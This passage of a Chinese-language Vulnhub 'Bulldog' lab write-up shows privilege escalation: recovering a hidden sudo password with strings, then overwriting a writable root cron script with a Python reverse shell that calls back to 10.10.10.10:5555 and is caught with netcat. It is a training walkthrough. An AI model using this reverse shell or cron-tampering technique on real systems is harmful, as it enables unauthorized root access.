+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ file customPermissionApp
+</span></span><span class=line><span class=cl>&lt;gadmin/.hiddenadmindirectory$ file customPermissionApp                      
+</span></span><span class=line><span class=cl>customPermissionApp: ELF 64-bit LSB executable, x86-64, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class=k>for</span> GNU/Linux 2.6.32, BuildID<span class=o>[</span>sha1<span class=o>]=</span>c9f2333253302d74eff3da59653f82d28f9eb36f, not stripped
+</span></span><span class=line><span class=cl>django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ strings customPermissionApp
+</span></span><span class=line><span class=cl>&lt;gadmin/.hiddenadmindirectory$ strings customPermissionApp                   
+</span></span><span class=line><span class=cl>/lib64/ld-linux-x86-64.so.2
+</span></span><span class=line><span class=cl>32S0-t
+</span></span><span class=line><span class=cl>libc.so.6
+</span></span><span class=line><span class=cl>puts
+</span></span><span class=line><span class=cl>__stack_chk_fail
+</span></span><span class=line><span class=cl>system
+</span></span><span class=line><span class=cl>__libc_start_main
+</span></span><span class=line><span class=cl>__gmon_start__
+</span></span><span class=line><span class=cl>GLIBC_2.4
+</span></span><span class=line><span class=cl>GLIBC_2.2.5
+</span></span><span class=line><span class=cl>UH-H
+</span></span><span class=line><span class=cl>SUPERultH
+</span></span><span class=line><span class=cl>imatePASH
+</span></span><span class=line><span class=cl>SWORDyouH
+</span></span><span class=line><span class=cl>CANTget
+</span></span><span class=line><span class=cl>dH34%<span class=o>(</span>
+</span></span><span class=line><span class=cl>AWAVA
+</span></span><span class=line><span class=cl>AUATL
+</span></span><span class=line><span class=cl><span class=o>[]</span>A<span class=se>\A</span><span class=o>]</span>A^A_
+</span></span><span class=line><span class=cl>Please enter a valid username to use root privileges
+</span></span><span class=line><span class=cl>        Usage: ./customPermissionApp &lt;username&gt;
+</span></span><span class=line><span class=cl>sudo su root
+</span></span><span class=line><span class=cl><span class=p>;</span>*3$<span class=s2>&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
+</span></span></span><span class=line><span class=cl><span class=s2>crtstuff.c
+</span></span></span><span class=line><span class=cl><span class=s2>__JCR_LIST__
+</span></span></span><span class=line><span class=cl><span class=s2>deregister_tm_clones
+</span></span></span><span class=line><span class=cl><span class=s2>__do_global_dtors_aux
+</span></span></span><span class=line><span class=cl><span class=s2>completed.7585
+</span></span></span><span class=line><span class=cl><span class=s2>__do_global_dtors_aux_fini_array_entry
+</span></span></span><span class=line><span class=cl><span class=s2>frame_dummy
+</span></span></span><span class=line><span class=cl><span class=s2>__frame_dummy_init_array_entry
+</span></span></span><span class=line><span class=cl><span class=s2>customPermissionApp.c
+</span></span></span><span class=line><span class=cl><span class=s2>__FRAME_END__
+</span></span></span><span class=line><span class=cl><span class=s2>__JCR_END__
+</span></span></span><span class=line><span class=cl><span class=s2>__init_array_end
+</span></span></span><span class=line><span class=cl><span class=s2>_DYNAMIC
+</span></span></span><span class=line><span class=cl><span class=s2>__init_array_start
+</span></span></span><span class=line><span class=cl><span class=s2>__GNU_EH_FRAME_HDR
+</span></span></span><span class=line><span class=cl><span class=s2>_GLOBAL_OFFSET_TABLE_
+</span></span></span><span class=line><span class=cl><span class=s2>__libc_csu_fini
+</span></span></span><span class=line><span class=cl><span class=s2>_ITM_deregisterTMCloneTable
+</span></span></span><span class=line><span class=cl><span class=s2>puts@@GLIBC_2.2.5
+</span></span></span><span class=line><span class=cl><span class=s2>_edata
+</span></span></span><span class=line><span class=cl><span class=s2>__stack_chk_fail@@GLIBC_2.4
+</span></span></span><span class=line><span class=cl><span class=s2>system@@GLIBC_2.2.5
+</span></span></span><span class=line><span class=cl><span class=s2>__libc_start_main@@GLIBC_2.2.5
+</span></span></span><span class=line><span class=cl><span class=s2>__data_start
+</span></span></span><span class=line><span class=cl><span class=s2>__gmon_start__
+</span></span></span><span class=line><span class=cl><span class=s2>__dso_handle
+</span></span></span><span class=line><span class=cl><span class=s2>_IO_stdin_used
+</span></span></span><span class=line><span class=cl><span class=s2>__libc_csu_init
+</span></span></span><span class=line><span class=cl><span class=s2>__bss_start
+</span></span></span><span class=line><span class=cl><span class=s2>main
+</span></span></span><span class=line><span class=cl><span class=s2>_Jv_RegisterClasses
+</span></span></span><span class=line><span class=cl><span class=s2>__TMC_END__
+</span></span></span><span class=line><span class=cl><span class=s2>_ITM_registerTMCloneTable
+</span></span></span><span class=line><span class=cl><span class=s2>.symtab
+</span></span></span><span class=line><span class=cl><span class=s2>.strtab
+</span></span></span><span class=line><span class=cl><span class=s2>.shstrtab
+</span></span></span><span class=line><span class=cl><span class=s2>.interp
+</span></span></span><span class=line><span class=cl><span class=s2>.note.ABI-tag
+</span></span></span><span class=line><span class=cl><span class=s2>.note.gnu.build-id
+</span></span></span><span class=line><span class=cl><span class=s2>.gnu.hash
+</span></span></span><span class=line><span class=cl><span class=s2>.dynsym
+</span></span></span><span class=line><span class=cl><span class=s2>.dynstr
+</span></span></span><span class=line><span class=cl><span class=s2>.gnu.version
+</span></span></span><span class=line><span class=cl><span class=s2>.gnu.version_r
+</span></span></span><span class=line><span class=cl><span class=s2>.rela.dyn
+</span></span></span><span class=line><span class=cl><span class=s2>.rela.plt
+</span></span></span><span class=line><span class=cl><span class=s2>.init
+</span></span></span><span class=line><span class=cl><span class=s2>.plt.got
+</span></span></span><span class=line><span class=cl><span class=s2>.text
+</span></span></span><span class=line><span class=cl><span class=s2>.fini
+</span></span></span><span class=line><span class=cl><span class=s2>.rodata
+</span></span></span><span class=line><span class=cl><span class=s2>.eh_frame_hdr
+</span></span></span><span class=line><span class=cl><span class=s2>.eh_frame
+</span></span></span><span class=line><span class=cl><span class=s2>.init_array
+</span></span></span><span class=line><span class=cl><span class=s2>.fini_array
+</span></span></span><span class=line><span class=cl><span class=s2>.jcr
+</span></span></span><span class=line><span class=cl><span class=s2>.dynamic
+</span></span></span><span class=line><span class=cl><span class=s2>.got.plt
+</span></span></span><span class=line><span class=cl><span class=s2>.data
+</span></span></span><span class=line><span class=cl><span class=s2>.bss
+</span></span></span><span class=line><span class=cl><span class=s2>.comment
+</span></span></span><span class=line><span class=cl><span class=s2>django@bulldog:/home/bulldogadmin/.hiddenadmindirectory</span>$<span class=s2>
+</span></span></span></code></pre></td></tr></table></div></div><p>有个很隐晦难看清楚的信息</p><p>SUPERultH
+imatePASH
+SWORDyouH
+CANTget</p><p>这个H很多余，可能是strings命令切片的锅，拼接一下就是 SUPERultimatePASSWORDyouCANTget</p><p>这下看懂是什么了吧</p><h3 id=再次sudo-提权>再次sudo 提权</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ sudo su 
+</span></span><span class=line><span class=cl>sudo su 
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> django: SUPERultimatePASSWORDyouCANTget
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>root@bulldog:/home/bulldogadmin/.hiddenadmindirectory#
+</span></span></code></pre></td></tr></table></div></div><p>成功</p><h2 id=得到flag>得到flag</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@bulldog:/home/bulldogadmin/.hiddenadmindirectory# <span class=nb>cd</span> /root
+</span></span><span class=line><span class=cl><span class=nb>cd</span> /root
+</span></span><span class=line><span class=cl>root@bulldog:~# ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>congrats.txt
+</span></span><span class=line><span class=cl>root@bulldog:~# cat congrats.txt
+</span></span><span class=line><span class=cl>cat congrats.txt
+</span></span><span class=line><span class=cl>Congratulations on completing this VM :D That wasn<span class=s1>&#39;t so bad was it?
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Let me know what you thought on twitter, I&#39;</span>m @frichette_n
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>As far as I know there are two ways to get root. Can you find the other one?
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!
+</span></span><span class=line><span class=cl>root@bulldog:~# 
+</span></span></code></pre></td></tr></table></div></div><p>提示我们还有一种可能到root权限，尝试一下</p><h2 id=寻找新的提权方法>寻找新的提权方法</h2><p>ctrl + c 退出这个shell，重新监听，重新在表单提交注入shell命令,记得升级交互shell，重新枚举一下文件</p><p>看看系统有没有安排什么定时任务，以及这些任务是谁执行的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ cat /etc/crontab
+</span></span><span class=line><span class=cl>cat /etc/crontab
+</span></span><span class=line><span class=cl><span class=c1># /etc/crontab: system-wide crontab</span>
+</span></span><span class=line><span class=cl><span class=c1># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># command to install the new version when you edit this file</span>
+</span></span><span class=line><span class=cl><span class=c1># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span class=line><span class=cl><span class=c1># that none of the other crontabs do.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>SHELL</span><span class=o>=</span>/bin/sh
+</span></span><span class=line><span class=cl><span class=nv>PATH</span><span class=o>=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># m h dom mon dow user  command</span>
+</span></span><span class=line><span class=cl><span class=m>17</span> *    * * *   root    <span class=nb>cd</span> / <span class=o>&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span class=line><span class=cl><span class=m>25</span> <span class=m>6</span>    * * *   root    <span class=nb>test</span> -x /usr/sbin/anacron <span class=o>||</span> <span class=o>(</span> <span class=nb>cd</span> / <span class=o>&amp;&amp;</span> run-parts --report /etc/cron.daily <span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>47</span> <span class=m>6</span>    * * <span class=m>7</span>   root    <span class=nb>test</span> -x /usr/sbin/anacron <span class=o>||</span> <span class=o>(</span> <span class=nb>cd</span> / <span class=o>&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>52</span> <span class=m>6</span>    <span class=m>1</span> * *   root    <span class=nb>test</span> -x /usr/sbin/anacron <span class=o>||</span> <span class=o>(</span> <span class=nb>cd</span> / <span class=o>&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>没有看到明显的自定义 root 定时任务</p><p>但是我们再根据 /etc/cron.d/ 找找有什么线索</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ ls -liah /etc/cron.d/
+</span></span><span class=line><span class=cl>ls -liah /etc/cron.d/
+</span></span><span class=line><span class=cl>total 24K
+</span></span><span class=line><span class=cl><span class=m>131321</span> drwxr-xr-x  <span class=m>2</span> root root 4.0K Aug <span class=m>26</span>  <span class=m>2017</span> .
+</span></span><span class=line><span class=cl><span class=m>131073</span> drwxr-xr-x <span class=m>94</span> root root 4.0K Aug <span class=m>11</span> 00:47 ..
+</span></span><span class=line><span class=cl><span class=m>137250</span> -rw-r--r--  <span class=m>1</span> root root  <span class=m>589</span> Jul <span class=m>16</span>  <span class=m>2014</span> mdadm
+</span></span><span class=line><span class=cl><span class=m>131322</span> -rw-r--r--  <span class=m>1</span> root root  <span class=m>102</span> Apr  <span class=m>5</span>  <span class=m>2016</span> .placeholder
+</span></span><span class=line><span class=cl><span class=m>137596</span> -rw-r--r--  <span class=m>1</span> root root  <span class=m>191</span> Aug <span class=m>24</span>  <span class=m>2017</span> popularity-contest
+</span></span><span class=line><span class=cl><span class=m>141859</span> -rw-r--r--  <span class=m>1</span> root root   <span class=m>54</span> Aug <span class=m>26</span>  <span class=m>2017</span> runAV
+</span></span></code></pre></td></tr></table></div></div><p>这个runAV存疑，读取看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ cat /etc/cron.d/runAV
+</span></span><span class=line><span class=cl>cat /etc/cron.d/runAV
+</span></span><span class=line><span class=cl>*/1 * * * * root /.hiddenAVDirectory/AVApplication.py
+</span></span></code></pre></td></tr></table></div></div><p>可以看到之前看到这个hiddle目录下面的这个脚本会被每一分钟以root身份执行一次，</p><p>假如说，我们能以当前身份去篡改这个脚本，我们极有可能因为这个配置错误，去提权,先读取一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ cat /.hiddenAVDirectory/AVApplication.py
+</span></span><span class=line><span class=cl>cat /.hiddenAVDirectory/AVApplication.py
+</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Just wanted to throw this placeholder here really quick.</span>
+</span></span><span class=line><span class=cl><span class=c1># We will put the full AV here when the vendor is done making it.</span>
+</span></span><span class=line><span class=cl><span class=c1># - Alan</span>
+</span></span><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ 
+</span></span></code></pre></td></tr></table></div></div><p>一个占位脚本，后面用来放av。。。 起初看到这个文件夹名字我还觉得我想歪了，尝试篡改脚本</p><h2 id=篡改脚本检验是否存在漏洞>篡改脚本，检验是否存在漏洞</h2><p>人道主义备份一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>cp /.hiddenAVDirectory/AVApplication.py /tmp/AVApplication.py.bak
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>django@bulldog:/home/django/bulldog$ <span class=nb>echo</span> <span class=s1>&#39;import os; os.system(&#34;id &gt; /tmp/cron_test&#34;)&#39;</span> &gt; /.hiddenAVDirectory/AVApplication.py
+</span></span><span class=line><span class=cl>&lt; os.system<span class=o>(</span><span class=s2>&#34;id &gt; /tmp/cron_test&#34;</span><span class=o>)</span><span class=err>&#39;</span> &gt; /.hiddenAVDirectory/AVApplication.py
+</span></span></code></pre></td></tr></table></div></div><p>等一分钟读取在/tmp/cron_test文件看看能不能执行这个id命令,当然也可以手动执行</p><h2 id=验证漏洞存在提权成功>验证漏洞存在，提权成功</h2><p>再次对这个脚本修改，然后我们先新开一个终端进行监听，nc -lvnp 5555</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;#!/usr/bin/env python\nimport socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((&#34;10.10.10.10&#34;,5555))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn(&#34;/bin/bash&#34;)\n&#39;</span> &gt; /.hiddenAVDirectory/AVApplication.py
+</span></span></code></pre></td></tr></table></div></div><p>等1分钟看看结果</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ nc -lvnp <span class=m>5555</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>5555</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.10.10<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.137<span class=o>]</span> <span class=m>44736</span>
+</span></span><span class=line><span class=cl>root@bulldog:~# 
+</span></span></code></pre></td></tr></table></div></div></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby><br></section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
